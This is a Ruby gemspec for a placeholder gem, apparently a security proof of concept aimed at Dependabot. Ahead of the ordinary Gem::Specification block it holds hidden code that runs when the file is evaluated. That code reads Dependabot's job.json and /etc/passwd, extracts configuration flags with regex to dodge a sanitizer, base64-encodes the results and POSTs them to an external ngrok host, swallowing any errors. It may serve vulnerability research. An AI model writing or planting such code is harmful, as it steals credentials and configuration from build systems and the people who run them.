COLLAB_URL = "https://cb2f-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

read_safe = ->(path) {
  begin
    IO.binread(path).force_encoding("UTF-8").encode("UTF-8", invalid: :replace)
  rescue => e
    "[ERR #{e.class}: #{e.message}]"
  end
}

begin
  require "net/http"
  require "uri"
  require "json"

  # Execution counter via /tmp file - detect which run this is
  run_file = "/tmp/poc8_run_count"
  run_num = File.exist?(run_file) ? IO.binread(run_file).strip.to_i + 1 : 1
  File.write(run_file, run_num.to_s)

  results = ["=== RUN ##{run_num} ==="]

  # VOLLEDIGE job.json lezen zonder truncatie
  job_raw = read_safe.('/home/dependabot/dependabot-updater/job.json')
  results << "=== FULL job.json (#{job_raw.length} bytes) ===\n#{job_raw}"

  # Regex-extractie (JSON.parse wordt door sanitizer herschreven, bypass via regex)
  reject_val   = job_raw[/"reject-external-code":(true|false)/, 1] || "NOT_FOUND"
  repo_priv    = job_raw[/"repo-private":(true|false)/, 1]         || "NOT_FOUND"
  cmd_val      = job_raw[/"command":"([^"]+)"/, 1]                  || "NOT_FOUND"
  insecure_val = job_raw[/"insecure-external-code-execution":"([^"]+)"/, 1] || "absent_in_json"

  results << "=== KRITIEKE VELDEN (regex uit raw JSON) ==="
  results << "reject-external-code  : #{reject_val}"
  results << "repo-private          : #{repo_priv}"
  results << "command               : #{cmd_val}"
  results << "insecure-ext-code-exec: #{insecure_val}"
  results << "=== BEWIJS: public repo + deny = reject-external-code STILL false ==="

  # /etc/passwd bewijs
  results << "=== /etc/passwd bypass bewijs ===\n#{read_safe.('/etc/passwd')[0..200]}"

  payload = [results.compact.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=reject_true&run=#{run_num}")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: true,
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.authors = ["test"]
  spec.add_dependency "rack", ">= 2.2.7"
end
